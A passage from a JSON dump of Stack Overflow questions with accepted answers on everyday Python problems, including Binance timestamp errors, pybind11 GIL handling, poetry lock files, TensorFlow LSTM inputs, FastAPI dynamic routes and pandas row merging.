    "Body": "I am writing some Python code to create an order with the Binance API:\nfrom binance.client import Client\n\nclient = Client(API_KEY, SECRET_KEY)\n\nclient.create_order(symbol='BTCUSDT',\n                    recvWindow=59999, #The value can't be greater than 60K\n                    side='BUY',\n                    type='MARKET',\n                    quantity = 0.004)\n\nUnfortunately I get the following error message:\n\"BinanceAPIException: APIError(code=-1021): Timestamp for this request was 1000ms ahead of the server's time.\"\n\nI already checked the difference (in miliseconds) between the Binance server time and my local time:\nimport time\nimport requests\nimport json\nurl = \"https://api.binance.com/api/v1/time\"\nt = time.time()*1000\nr = requests.get(url)\n\nresult = json.loads(r.content)\n\nprint(int(t)-result[\"serverTime\"]) \n\nOUTPUT: 6997\n\nIt seems that the recvWindow of 60000 is still not sufficient (but it may not exceed 60K). I still get the same error.\nDoes anybody know how I can solve this issue?\nMany thanks in advance!\n",
    "AcceptedAnswerId": 72763542,
    "AcceptedAnswer": "Probably the PC's time is out of sync.\nYou can do it using Windows -> Setting-> Time & Language -> Date & Time -> 'Sync Now'.\nScreenshot:\n\n"
}
{
    "Id": 73997582,
    "PostTypeId": 1,
    "Title": "Should I repeat parent class __init__ arguments in the child class's __init__, or using **kwargs instead",
    "Body": "Imagine a base class that you'd like to inherit from:\nclass Shape:\n    def __init__(self, x: float, y: float):\n        self.x = x\n        self.y = y\n\nThere seem to be two common patterns of handling a parent's kwargs in a child class's __init__ method.\nYou can restate the parent's interface completely:\nclass Circle(Shape):\n    def __init__(self, x: float, y: float, radius: float):\n        super().__init__(x=x, y=y)\n        self.radius = radius\n\nOr you can specify only the part of the interface which is specific to the child, and hand the remaining kwargs to the parent's __init__:\nclass Circle(Shape):\n    def __init__(self, radius: float, **kwargs):\n        super().__init__(**kwargs)\n        self.radius = radius\n\nBoth of these seem to have pretty big drawbacks, so I'd be interested to hear what is considered standard or best practice.\nThe \"restate the interface\" method is appealing in toy examples like you commonly find in discussions of Python inheritance, but what if we're subclassing something with a really complicated interface, like pandas.DataFrame or logging.Logger?\nAlso, if the parent interface changes, I have to remember to change all of my child class's interfaces to match, type hints and all. Not very DRY.\nIn these cases, you're almost certain to go for the **kwargs option.\nBut the **kwargs option leaves the user unsure about which arguments are actually required.\nIn the toy example above, a user might naively write:\ncircle = Circle()  # Argument missing for parameter \"radius\"\n\nTheir IDE (or mypy or Pyright) is being helpful and saying that the radius parameter is required.\ncircle = Circle(radius=5)\n\nThe IDE (or type checker) is now happy, but the code won't actually run:\nTraceback (most recent call last):\n  File \"foo.py\", line 13, in \n    circle = Circle(radius=5)\n  File \"foo.py\", line 9, in __init__\n    super().__init__(**kwargs)\nTypeError: Shape.__init__() missing 2 required positional arguments: 'x' and 'y'\n\nSo I'm stuck with a choice between writing out the parent interface multiple times, and not being warned by my IDE when I'm using a child class incorrectly.\nWhat to do?\nResearch\nThis mypy issue is loosely related to this.\nThis reddit thread has a good rehearsal of the relevant arguments for/against each approach I outline.\nThis SO question is maybe a duplicate of this one. Does the fact I'm talking about __init__ make any difference though?\nI've found a real duplicate, although the answer is a bit esoteric and doesn't seem like it would qualify as best, or normal, practice.\n",
    "AcceptedAnswerId": 74027245,
    "AcceptedAnswer": "If the parent class has required (positional) arguments (as your Shape class does), then I'd argue that you must include those arguments in the __init__ of the child (Circle) for the sake of being able to pass around \"shape-like\" instances and be sure that a Circle will behave like any other shape.  So this would be your Circle class:\nclass Shape:\n    def __init__(x: float, y: float):\n        self.x = x\n        self.y = y\n\n\nclass Circle(Shape):\n    def __init__(x: float, y: float, radius: float):\n        super().__init__(x=x, y=y)\n        self.radius = radius\n\n\n# The expectation is that this should work with all instances of `Shape`\ndef move_shape(shape: Shape, x: float, y: float):\n    shape.x = x\n    shape.y = y\n\nHowever if the parent class is using optional kwargs, that's where stuff gets tricky.  You shouldn't have to define colour: str on your Circle class just because colour is an optional argument for Shape.  It's up to the developer using your Circle class to know the interface of all shapes and if need be, interrogate the code and note that Circle can accept colour=green as it passes **kwargs to its parent constructor:\nclass Shape:\n    def __init__(x: float, y: float, colour: str = \"black\"):\n        self.x = x\n        self.y = y\n        self.colour = colour \n\n\nclass Circle(Shape):\n    def __init__(x: float, y: float, radius: float, **kwargs):\n        super().__init__(x=x, y=y, **kwargs)\n        self.radius = radius\n\n\ndef move_shape(shape: Shape, x: float, y: float):\n    shape.x = x\n    shape.y = y\n\n\ndef colour_shape(shape: Shape, colour: str):\n    shape.colour = colour\n\nGenerally my attitude is that a docstring exists to explain why something is written the way it is, not what it's doing.  That should be clear from the code.  So, if your Circle requires an x and y parameter for use in the parent class, then it should say as much in the signature.  If the parent class has optional requirements, then **kwargs is sufficient in the child class and it's incumbent upon the developer to interrogate Circle and Shape to see what the options are.\n"
}
{
    "Id": 72876146,
    "PostTypeId": 1,
    "Title": "Handling GIL when calling python lambda from C++ function",
    "Body": "The question\nIs pybind11 somehow magically doing the work of PyGILState_Ensure() and PyGILState_Release()? And if not, how should I do it?\nMore details\nThere are many questions regarding passing a python function to C++ as a callback using pybind11, but I haven't found one that explains the use of the GIL with pybind11.\nThe documentation is pretty clear about the GIL:\n\n[...] However, when threads are created from C (for example by a third-party library with its own thread management), they don\u2019t hold the GIL, nor is there a thread state structure for them.\nIf you need to call Python code from these threads (often this will be part of a callback API provided by the aforementioned third-party library), you must first register these threads with the interpreter by creating a thread state data structure, then acquiring the GIL, and finally storing their thread state pointer, before you can start using the Python/C API.\n\nI can easily bind a C++ function that takes a callback:\npy::class_ some_api(m, \"SomeApi\"); \nsome_api\n    .def(py::init())\n    .def(\"mode\", &SomeApi::subscribe_mode, \"Subscribe to 'mode' updates.\");\n\nWith the corresponding C++ function being something like:\nvoid subscribe_mode(const std::function& mode_callback);\n\nBut because pybind11 cannot know about the threading happening in my C++ implementation, I suppose it cannot handle the GIL for me. Therefore, if mode_callback is called by a thread created from C++, does that mean that I should write a wrapper to SomeApi::subscribe_mode that uses PyGILState_Ensure() and PyGILState_Release() for each call?\nThis answer seems to be doing something similar, but still slightly different: instead of \"taking the GIL\" when calling the callback, it seems like it \"releases the GIL\" when starting/stopping the thread. Still I'm wondering if there exists something like py::call_guard() that would do exactly what I (believe I) need, i.e. wrapping my callback with PyGILState_Ensure() and PyGILState_Release().\n",
    "AcceptedAnswerId": 72933328,
    "AcceptedAnswer": "In general\npybind11 tries to do the Right Thing and the GIL will be held when pybind11 knows that it is calling a python function, or in C++ code that is called from python via pybind11. The only time that you need to explicitly acquire the GIL when using pybind11 is when you are writing C++ code that accesses python and will be called from other C++ code, or if you have explicitly dropped the GIL.\nstd::function wrapper\nThe wrapper for std::function always acquires the GIL via gil_scoped_acquire when the function is called, so your python callback will always be called with the GIL held, regardless which thread it is called from.\nIf gil_scoped_acquire is called from a thread that does not currently have a GIL thread state associated with it, then it will create a new thread state. As a side effect, if nothing else in the thread acquires the thread state and increments the reference count, then once your function exits the GIL will be released by the destructor of gil_scoped_acquire and then it will delete the thread state associated with that thread.\nIf you're only calling the function once from another thread, this isn't a problem. If you're calling the callback often, it will create/delete the thread state a lot, which probably isn't great for performance. It would be better to cause the thread state to be created when your thread starts (or even easier, start the thread from Python and call your C++ code from python).\n"
}
{
    "Id": 71558637,
    "PostTypeId": 1,
    "Title": "Poetry fails with \"Retrieved digest for package not in poetry.lock metadata\"",
    "Body": "We're trying to merge and old branch in a project and when trying to build a docker image, poetry seems to fail for some reason that I don't understand.\nI'm not very familiar with poetry, as I've only used requirements.txt for dependencies up to now, so I'm fumbling a bit on what's going on.\nThe error that I'm getting (part of the playbook that builds the image on the server) is this:\n       \"Installing dependencies from lock file\",\n        \"\",\n        \"Package operations: 16 installs, 14 updates, 0 removals\",\n        \"\",\n        \"  \u2022 Updating importlib-metadata (4.8.3 -> 2.0.0)\",\n        \"  \u2022 Updating pyparsing (3.0.6 -> 2.4.7)\",\n        \"  \u2022 Updating six (1.16.0 -> 1.15.0)\",\n        \"\",\n        \"  RuntimeError\",\n        \"\",\n        \"  Retrieved digest for link six-1.15.0.tar.gz(sha256:30639c035cdb23534cd4aa2dd52c3bf48f06e5f4a941509c8bafd8ce11080259) not in poetry.lock metadata ['30639c035cdb23534cd4aa2dd52c3bf48f06e5f4a941509c8bafd8ce11080259', '8b74bedcbbbaca38ff6d7491d76f2b06b3592611af620f8426e82dddb04a5ced']\",\n        \"\",\n        \"  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links\",\n        \"      111\u2502 \",\n        \"      112\u2502         if links and not selected_links:\",\n        \"      113\u2502             raise RuntimeError(\",\n        \"      114\u2502                 \\\"Retrieved digest for link {}({}) not in poetry.lock metadata {}\\\".format(\",\n        \"    \u2192 115\u2502                     link.filename, h, hashes\",\n        \"      116\u2502                 )\",\n        \"      117\u2502             )\",\n        \"      118\u2502 \",\n        \"      119\u2502         return selected_links\",\n        \"\",\n        \"\",\n        \"  RuntimeError\",\n        \"\",\n        \"  Retrieved digest for link pyparsing-2.4.7.tar.gz(sha256:c203ec8783bf771a155b207279b9bccb8dea02d8f0c9e5f8ead507bc3246ecc1) not in poetry.lock metadata ['c203ec8783bf771a155b207279b9bccb8dea02d8f0c9e5f8ead507bc3246ecc1', 'ef9d7589ef3c200abe66653d3f1ab1033c3c419ae9b9bdb1240a85b024efc88b']\",\n        \"\",\n        \"  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links\",\n        \"      111\u2502 \",\n        \"      112\u2502         if links and not selected_links:\",\n        \"      113\u2502             raise RuntimeError(\",\n        \"      114\u2502                 \\\"Retrieved digest for link {}({}) not in poetry.lock metadata {}\\\".format(\",\n        \"    \u2192 115\u2502                     link.filename, h, hashes\",\n        \"      116\u2502                 )\",\n        \"      117\u2502             )\",\n        \"      118\u2502 \",\n        \"      119\u2502         return selected_links\",\n        \"\",\n        \"\",\n        \"  RuntimeError\",\n        \"\",\n        \"  Retrieved digest for link importlib_metadata-2.0.0.tar.gz(sha256:77a540690e24b0305878c37ffd421785a6f7e53c8b5720d211b211de8d0e95da) not in poetry.lock metadata ['77a540690e24b0305878c37ffd421785a6f7e53c8b5720d211b211de8d0e95da', 'cefa1a2f919b866c5beb7c9f7b0ebb4061f30a8a9bf16d609b000e2dfaceb9c3']\",\n        \"\",\n        \"  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links\",\n        \"      111\u2502 \",\n        \"      112\u2502         if links and not selected_links:\",\n        \"      113\u2502             raise RuntimeError(\",\n        \"      114\u2502                 \\\"Retrieved digest for link {}({}) not in poetry.lock metadata {}\\\".format(\",\n        \"    \u2192 115\u2502                     link.filename, h, hashes\",\n        \"      116\u2502                 )\",\n        \"      117\u2502             )\",\n        \"      118\u2502 \",\n        \"      119\u2502         return selected_links\"\n    ]\n}\n\nIf you notice, for all 3 packages, the retrieved digest is actually in the list of digests of the metadata section of the poetry lock file.\nOur guess is that maybe this lock file was generated by an older version of poetry and is no longer valid. Maybe a hashing method should be mentioned (for example the retrieved digest is sha256, but no method is specified on the ones that are compared with it)?\nAnother curious thing is that poetry is not installed inside the dockerfile, but seems to reach that point, nevetheless, and I'm really curious how this can happen.\nAny insight would be greatly appreciated (and any link with more information, even)!\nThanks a lot for your time!  (Feel free to ask for more information if this seems inadequate to you!)\nCheers!\n",
    "AcceptedAnswerId": 72980882,
    "AcceptedAnswer": "When I've had this issue myself it has been fixed by recreating the lock file using a newer version of poetry. If you are able to view the .toml file I suggest deleting this lock file and then running poetry install to create a new lock file.\n"
}
{
    "Id": 72831076,
    "PostTypeId": 1,
    "Title": "How can I use a sequence of numbers to predict a single number in Tensorflow?",
    "Body": "I am trying to build a machine learning model which predicts a single number from a series of numbers. I am using a Sequential model from the keras API of Tensorflow.\nYou can imagine my dataset to look something like this:\n\n\n\n\nIndex\nx data\ny data\n\n\n\n\n0\nnp.ndarray(shape (1209278,) )\nnumpy.float32\n\n\n1\nnp.ndarray(shape (1211140,) )\nnumpy.float32\n\n\n2\nnp.ndarray(shape (1418411,) )\nnumpy.float32\n\n\n3\nnp.ndarray(shape (1077132,) )\nnumpy.float32\n\n\n...\n...\n...\n\n\n\n\nThis was my first attempt:\nI tried using a numpy ndarray which contains numpy ndarrays which finally contain floats as my xdata, so something like this:\narray([\n    array([3.59280851, 3.60459062, 3.60459062, ..., 4.02911493])\n    array([3.54752101, 3.56740332, 3.56740332, ..., 4.02837855])\n    array([3.61048168, 3.62152741, 3.62152741, ..., 4.02764217])\n])\n\nMy y data is a numpy ndarray containing floats, which looks something like this\narray([2.9864411, 3.0562437, ... , 2.7750807, 2.8712902], dtype=float32)\n\nBut when I tried to train the model using model.fit() it yields this error:\nValueError: Failed to convert a NumPy array to a Tensor (Unsupported object type numpy.ndarray).\n\nI was able to solve this error by asking a question related to this:\nHow can I have a series of numpy ndarrays as the input data to train a tensorflow machine learning model?\nMy latest attempt:\nBecause Tensorflow does not seem to be able to convert a ndarray of ndarrays to a tensor, I tried to convert my x data to a list of ndarrays like this:\n[\n    array([3.59280851, 3.60459062, 3.60459062, ..., 4.02911493])\n    array([3.54752101, 3.56740332, 3.56740332, ..., 4.02837855])\n    array([3.61048168, 3.62152741, 3.62152741, ..., 4.02764217])\n]\n\nI left my y data untouched, so as a ndarray of floats.\nSadly my attempt of using a list of ndarrays instead of a ndarray of ndarrays yielded this error:\nValueError: Data cardinality is ambiguous:\n  x sizes: 1304593, 1209278, 1407624, ...\n  y sizes: 46\nMake sure all arrays contain the same number of samples.\n\nAs you can see, my x data consists of arrays which all have a different shape.\nBut I don't think that this should be a problem.\nQuestion:\nMy guess is that Tensorflow tries to use my list of arrays as multiple inputs.\nTensorflow fit() documentation\nBut I don't want to use my x data as multiple inputs.\nEasily said I just want my model to predict a number from a sequence of numbers.\nFor example like this:\n\narray([3.59280851, 3.60459062, 3.60459062, ...]) => 2.8989773\narray([3.54752101, 3.56740332, 3.56740332, ...]) => 3.0893357\n...\n\nHow can I use a sequence of numbers to predict a single number in Tensorflow?\nEDIT\nMaybe I should have added that I want to use a RNN, especially a LSTM.\nI have had a look at the Keras documentation, and in their simplest example they are using a Embedding layer. But I don't really know what to do.\nAll in all I think that my question ist pretty general and should be easy to answer if you know how to tackle this problem, unlike me.\nThanks in advance!\n",
    "AcceptedAnswerId": 72869570,
    "AcceptedAnswer": "Try something like this:\nimport numpy as np\nimport tensorflow as tf\n\n# add additional dimension for lstm layer\nx_train = np.asarray(train_set[\"x data\"].values))[..., None] \ny_train = np.asarray(train_set[\"y data\"]).astype(np.float32)\n\nmodel = tf.keras.Sequential()\nmodel.add(tf.keras.layers.LSTM(units=32))\nmodel.add(tf.keras.layers.Dense(units=1))\nmodel.compile(loss=\"mean_squared_error\", optimizer=\"adam\", metrics=\"mse\")\nmodel.fit(x=x_train,y=y_train,epochs=10)\n\nOr with a ragged input for different sequence lengths:\nx_train = tf.ragged.constant(train_set[\"x data\"].values[..., None]) # add additional dimension for lstm layer\ny_train = np.asarray(train_set[\"y data\"]).astype(np.float32)\n\nmodel = tf.keras.Sequential()\nmodel.add(tf.keras.layers.Input(shape=[None, x_train.bounding_shape()[-1]], batch_size=2, dtype=tf.float32, ragged=True))\nmodel.add(tf.keras.layers.LSTM(units=32))\nmodel.add(tf.keras.layers.Dense(units=1))\nmodel.compile(loss=\"mean_squared_error\", optimizer=\"adam\", metrics=\"mse\")\nmodel.fit(x=x_train,y=y_train,epochs=10)\n\nOr:\nx_train = tf.ragged.constant([np.array(list(v))[..., None] for v in train_set[\"x data\"].values]) # add additional dimension for lstm layer\n\n"
}
{
    "Id": 73365780,
    "PostTypeId": 1,
    "Title": "Why is not recommended to install poetry with homebrew?",
    "Body": "Poetry official documentation strictly recommends sticking with the official installer. However, homebrew has poetry formulae.\nbrew install poetry\n\nUsually, I like to keep everything I can in homebrew to manage installations easily.\nWhat is the drawback and risks of installing poetry using homebrew instead of the recommended installation script?\n",
    "AcceptedAnswerId": 73365831,
    "AcceptedAnswer": "The drawback is that poetry will be unable to upgrade itself (I've no idea what'd actually happen), and you'll not be able to install specific poetry versions. Homebrew installed poetry will probably also depend on Homebrew-installed Python, etc, instead of having its own isolated venv to execute from.\nIf you use homebrew to install poetry, don't try to manage that installation any way outside of homebrew. Otherwise, it's probably fine.\n"
}
{
    "Id": 73049456,
    "PostTypeId": 1,
    "Title": "Apply the nested shape of one list on another flat list",
    "Body": "I have two lists:\nA: [[0, 1], [2, [3]], 4]\nB: [5, 6, 7, 8, 9]\nI wish list B could have the same shape with list A:\n[5, 6, 7, 8, 9] => [[5, 6], [7, [8]], 9]\nSo list A and list B have the same dimension/shape:\nA: [[0, 1], [2, [3]], 4]\nB: [[5, 6], [7, [8]], 9]\nConsider about time complexity, I hope there is a way of O(n) if possible.\n",
    "AcceptedAnswerId": 73049537,
    "AcceptedAnswer": "Assuming the number of items is identical, you could use a recursive function and an iterator:\nA = [[0, 1], [2, [3]], 4]\nB = [5, 6, 7, 8, 9]\n\ndef copy_shape(l, other):\n    if isinstance(other, list):\n        other = iter(other)\n    if isinstance(l, list):\n        return [copy_shape(x, other) for x in l]\n    else:\n        return next(other)\n    \nout = copy_shape(A, B)\n\noutput: [[5, 6], [7, [8]], 9]\nNB. the complexity is O(n). You can also use if hasattr(other, '__len__') or if not hasattr(other, '__next__') in place of if isinstance(other, list) to generalize to other iterables (except iterator).\n"
}
{
    "Id": 70783994,
    "PostTypeId": 1,
    "Title": "Reload routes in FastAPI during runtime",
    "Body": "I have a FastAPI app in which routes are dynamically generated based on an DB config.\nHowever, once the routes are defined and the app running, if the config changes, there seems to be no way to reload the config so that the routes could reflect the config.\nThe only solution I have for now is manually restart the asgi app by restarting uvicorn.\nIs there any way to fully regenerate routes without stopping the app, that could ideally be called from an URL ?\n",
    "AcceptedAnswerId": 74035526,
    "AcceptedAnswer": "It is possible to modify routes at runtime.\nFastAPI apps have the method add_api_route which allows you to dynamically define new endpoints. To remove an endpoint you will need to fiddle directly with the routes of the underlying Router.\nThe following code shows how to dynamically add and remove routes.\nimport fastapi\n\napp = fastapi.FastAPI()\n\n\n@app.get(\"/add\")\nasync def add(name: str):\n    async def dynamic_controller():\n        return f\"dynamic: {name}\"\n    app.add_api_route(f\"/dyn/{name}\", dynamic_controller, methods=[\"GET\"])\n    return \"ok\"\n\n\ndef route_matches(route, name):\n    return route.path_format == f\"/dyn/{name}\"\n\n\n@app.get(\"/remove\")\nasync def remove(name: str):\n    for i, r in enumerate(app.router.routes):\n        if route_matches(r, name):\n            del app.router.routes[i]\n            return \"ok\"\n    return \"not found\"\n\nAnd below is shown how to use it\n$ curl 127.0.0.1:8000/dyn/test\n{\"detail\":\"Not Found\"}\n$ curl 127.0.0.1:8000/add?name=test\n\"ok\"\n$ curl 127.0.0.1:8000/dyn/test\n\"dynamic: test\"\n$ curl 127.0.0.1:8000/add?name=test2\n\"ok\"\n$ curl 127.0.0.1:8000/dyn/test2\n\"dynamic: test2\"\n$ curl 127.0.0.1:8000/remove?name=test\n\"ok\"\n$ curl 127.0.0.1:8000/dyn/test\n{\"detail\":\"Not Found\"}\n$ curl 127.0.0.1:8000/dyn/test2\n\"dynamic: test2\"\n\nNote though, that if you change the routes dynamically you will need to invalidate the cache of the OpenAPI endpoint.\n"
}
{
    "Id": 74097901,
    "PostTypeId": 1,
    "Title": "meaning of `__all__` inside Python class",
    "Body": "I am aware of the use of __all__ at module scope. However I came across the usage of __all__ inside classes. This is done e.g. in the Python standardlib:\nclass re(metaclass=_DeprecatedType):\n    \"\"\"Wrapper namespace for re type aliases.\"\"\"\n\n    __all__ = ['Pattern', 'Match']\n    Pattern = Pattern\n    Match = Match\n\nWhat does __all__ achieve in this context?\n",
    "AcceptedAnswerId": 74098046,
    "AcceptedAnswer": "The typing module does some unorthodox things to patch existing modules (like re). Basically, the built-in module re is being replaced with this class re defined using a custom metaclass that intercepts attribute lookups on the underlying object. __all__ doesn't really have any special meaning to the class (it's just another class attribute), but it effectively becomes the __all__ attribute of the re module. It's the metaclass's definition of __getattribute__ that accomplishes this.\n"
}
{
    "Id": 73056540,
    "PostTypeId": 1,
    "Title": "No module named amazon_linux_extras when running amazon-linux-extras install epel -y",
    "Body": "Here is my (simplified) Dockerfile\n# https://docs.aws.amazon.com/lambda/latest/dg/images-create.html#images-create-from-base\nFROM public.ecr.aws/lambda/python:3.8\n\n# get the amazon linux extras\nRUN yum install -y amazon-linux-extras\n\nRUN amazon-linux-extras install epel -y\n\nWhen it reaches the RUN amazon-linux-extras install epel -y line during the build, it gets\nStep 6/8 : RUN amazon-linux-extras install epel -y\n ---> Running in dbb44f57111a\n/var/lang/bin/python: No module named amazon_linux_extras\nThe command '/bin/sh -c amazon-linux-extras install epel -y' returned a non-zero code: 1\n\nI think that has to do with some python 2 vs. 3 stuff, but I'm not sure\n",
    "AcceptedAnswerId": 73056713,
    "AcceptedAnswer": "You're correct, it's because amazon-linux-extras only works with Python 2. You can modify the RUN instruction to RUN PYTHON=python2 amazon-linux-extras install epel -y\n"
}
{
    "Id": 72893180,
    "PostTypeId": 1,
    "Title": "Flask-Restful Error: request Content-Type was not 'application/json'.\"}",
    "Body": "I was following this tutorial and it was going pretty well. He then introduced reqparse and I followed along. I tried to test my code and I get this error\n{'message': \"Did not attempt to load JSON data because the request Content-Type was not 'application/json'.\"}\nI don't know if I'm missing something super obvious but I'm pretty sure I copied his code exactly. here's the code:\nmain.py\nfrom flask import Flask, request\nfrom flask_restful import Api, Resource, reqparse\n\napp = Flask(__name__)\napi = Api(app)\n\n#basic get and post\nnames = {\"sai\": {\"age\": 19, \"gender\": \"male\"},\n            \"bill\": {\"age\": 23, \"gender\": \"male\"}}\nclass HelloWorld(Resource):\n    def get(self, name, numb):\n        return names[name]\n\n    def post(self):\n        return {\"data\": \"Posted\"}\n\napi.add_resource(HelloWorld, \"/helloworld//\")\n\n# getting larger data\npictures = {}\nclass picture(Resource):\n    def get(self, picture_id):\n        return pictures[picture_id]\n\n    def put(self, picture_id):\n        print(request.form['likes'])\n        pass\n\napi.add_resource(picture, \"/picture/\")\n\n# reqparse\nvideo_put_args = reqparse.RequestParser() # make new request parser object to make sure it fits the correct guidelines\nvideo_put_args.add_argument(\"name\", type=str, help=\"Name of the video\")\nvideo_put_args.add_argument(\"views\", type=int, help=\"Views on the video\")\nvideo_put_args.add_argument(\"likes\", type=int, help=\"Likes on the video\")\n\nvideos = {}\n\nclass Video(Resource):\n    def get(self, video_id):\n        return videos[video_id]\n\n    def post(self, video_id):\n        args = video_put_args.parse_args()\n        print(request.form['likes'])\n        return {video_id: args}\n\napi.add_resource(Video, \"/video/\")\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n\ntest_rest.py\nimport requests\n\nBASE = \"http://127.0.0.1:5000/\"\n\nresponse = requests.post(BASE + 'video/1', {\"likes\": 10})\n\nprint(response.json())\n\n",
    "AcceptedAnswerId": 72893595,
    "AcceptedAnswer": "I don't know why you have an issue as far as I can tell you did copy him exactly how he did it. Here's a fix that'll work although I can't explain why his code works and yours doesn't. His video is two years old so it could be deprecated behaviour.\nimport requests\nimport json\n\nBASE = \"http://127.0.0.1:5000/\"\n\npayload = {\"likes\": 10}\n\nheaders = {'accept': 'application/json'}\nresponse = requests.post(BASE + 'video/1', json=payload)\n\nprint(response.json())\n\n"
}
{
    "Id": 72956054,
    "PostTypeId": 1,
    "Title": "Zip like function that iterates over multiple items in lists and returns possibilities",
    "Body": "In the following code:\na = [[\"2022\"], [\"2023\"]]\nb = [[\"blue\", \"red\"], [\"green\", \"yellow\"]]\nc = [[\"1\", \"2\", \"3\"], [\"4\", \"5\", \"6\", \"7\"], [\"8\", \"9\", \"10\", \"11\"], [\"12\", \"13\"]]\n\nI would like a function that outputs this, but for any number of variables:\n[\n    [\"2022\", \"blue\", \"1\"],\n    [\"2022\", \"blue\", \"2\"],\n    [\"2022\", \"blue\", \"3\"],\n    [\"2022\", \"red\", \"4\"],\n    [\"2022\", \"red\", \"5\"],\n    [\"2022\", \"red\", \"6\"],\n    [\"2022\", \"red\", \"7\"],\n    [\"2023\", \"green\", \"8\"],\n    [\"2023\", \"green\", \"9\"],\n    [\"2023\", \"green\", \"10\"],\n    [\"2023\", \"green\", \"11\"],\n    [\"2023\", \"yellow\", \"12\"],\n    [\"2023\", \"yellow\", \"13\"],\n]\n\nI have searched for a function to do this with itertools or zip, but haven't found anything yet.\nTo clarify, my use case for this was to iterate through values of a nested/multi-level dropdown menu (the first dropdown returns options, and each option returns a different dropdown, and so on).\n",
    "AcceptedAnswerId": 72956257,
    "AcceptedAnswer": "First, you join the first argument, to a list of lists with only one element each.\nThen for each sublist and its index i in the next argument, you pick the i-th list of the previous iteration res[i] and add to aux len(sublist) lists each of one is the res[i] with one item from sublist.\nfrom itertools import chain\n\ndef f(*args):\n    res = list(chain.from_iterable([[item] for item in l] for l in args[0]))\n    for arg in args[1:]:\n        aux = []\n        for i, sublist in enumerate(arg):\n            aux += [res[i] + [opt] for opt in sublist]\n        res = aux\n    return res\n\nIn addition if you want to verify that the arguments passed to the function are correct, you can use this:\ndef check(*args):\n    size = sum(len(l) for l in args[0])\n    for arg in args[1:]:\n        if len(arg) != size:\n            return False\n        size = sum(len(l) for l in arg)\n    return True\n\n"
}
{
    "Id": 73436440,
    "PostTypeId": 1,
    "Title": "Replace and merge rows in pandas according to condition",
    "Body": "I have a dataframe:\n   lft rel rgt num\n0   t3  r3  z2  3\n1   t1  r3  x1  9\n2   x2  r3  t2  8\n3   x4  r1  t2  4\n4   t1  r1  z3  1\n5   x1  r1  t2  2\n6   x2  r2  t4  4\n7   z3  r2  t4  5\n8   t4  r3  x3  4\n9   z1  r2  t3  4\n\nAnd a reference dictionary:\nreplacement_dict = {\n    'X1' : ['x1', 'x2', 'x3', 'x4'],\n    'Y1' : ['y1', 'y2'],\n    'Z1' : ['z1', 'z2', 'z3']\n}\n\nMy goal is to replace all occurrences of replacement_dict['X1'] with 'X1', and then merge the rows together. For example, any instance of 'x1', 'x2', 'x3' or 'x4' will be replaced by 'X1', etc.\nI can do this by selecting the rows that contain any of these strings and replacing them with 'X1':\nkeys = replacement_dict.keys()\nfor key in keys:\n    DF.loc[DF['lft'].isin(replacement_dict[key]), 'lft'] = key\n    DF.loc[DF['rgt'].isin(replacement_dict[key]), 'rgt'] = key\n\ngiving:\n    lft rel rgt num\n0   t3  r3  Z1  3\n1   t1  r3  X1  9\n2   X1  r3  t2  8\n3   X1  r1  t2  4\n4   t1  r1  Z1  1\n5   X1  r1  t2  2\n6   X1  r2  t4  4\n7   Z1  r2  t4  5\n8   t4  r3  X1  4\n9   Z1  r2  t3  4\n\nNow, if I select all the rows containing 'X1' and merge them, I should end up with:\n    lft rel rgt num\n0   X1  r3  t2  8\n1   X1  r1  t2  6\n2   X1  r2  t4  4\n3   t1  r3  X1  9\n4   t4  r3  X1  4\n\nSo the three columns ['lft', 'rel', 'rgt'] are unique while the 'num' column is added up for each of these rows. The row 1 above : ['X1'  'r1'  't2'  6] is the sum of two rows ['X1'  'r1'  't2'  4] and ['X1'  'r1'  't2'  2].\nI can do this easily for a small number of rows, but I am working with a dataframe with 6 million rows and a replacement dictionary with 60,000 keys. This is taking forever using a simple row wise extraction and replacement.\nHow can this (specifically the last part) be scaled efficiently? Is there a pandas trick that someone can recommend?\n",
    "AcceptedAnswerId": 73436639,
    "AcceptedAnswer": "Reverse the replacement_dict mapping and map() this new mapping to each of lft and rgt columns to substitute certain values (e.g. x1->X1, y2->Y1 etc.). As some values in lft and rgt columns don't exist in the mapping (e.g. t1, t2 etc.), call fillna() to fill in these values.1\nYou may also stack() the columns whose values need to be replaced (lft and rgt), call map+fillna and unstack() back but because there are only 2 columns, it may not be worth the trouble for this particular case.\nThe second part of the question may be answered by summing num values after grouping by lft, rel and rgt columns; so groupby().sum() should do the trick.\n# reverse replacement map\nreverse_map = {v : k for k, li in replacement_dict.items() for v in li}\n\n# substitute values in lft column using reverse_map\ndf['lft'] = df['lft'].map(reverse_map).fillna(df['lft'])\n# substitute values in rgt column using reverse_map\ndf['rgt'] = df['rgt'].map(reverse_map).fillna(df['rgt'])\n\n# sum values in num column by groups\nresult = df.groupby(['lft', 'rel', 'rgt'], as_index=False)['num'].sum()\n\n1: map() + fillna() may perform better for your use case than replace() because under the hood, map() implements a Cython optimized take_nd() method that performs particularly well if there are a lot of values to replace, while replace() implements replace_list() method which uses a Python loop. So if replacement_dict is particularly large (which it is in your case), the difference in performance will be huge, but if replacement_dict is small, replace() may outperform map().\n"
}
{
    "Id": 74202814,
    "PostTypeId": 1,
    "Title": "In python, create index from flat representation of nested structure in a list, sorting by alphabetical order",
    "Body": "I have lists where each entry is representing a nested structure, where / represents each level in the structure.\n['a','a/b/a','a/b','a/b/d',....]\n\nI want to take such a list and return an index list where each level is sorted in alphabetical order.\nIf we had the following list\n['a','a/b','a/b/a','a/c','a/c/a','b']\n\nIt represents the nested structure\n'a':                   #1\n\n    'b':               #1.1\n         'a': ...      #1.1.1\n    'c':               #1.2\n         'a': ...      #1.2.1\n'b' : ...              #2\n\nI am trying to get the output\n ['1','1.1','1.1.1', '1.2','1.2.1','2']\n\nBut I am having real issue on how to tackle the problem, would it be solved recursively? Or what would be a way to solve this for any generic list where each level is separated by /? The list is originally not necessarily sorted, and each level can be any generic word.\n",
    "AcceptedAnswerId": 74204355,
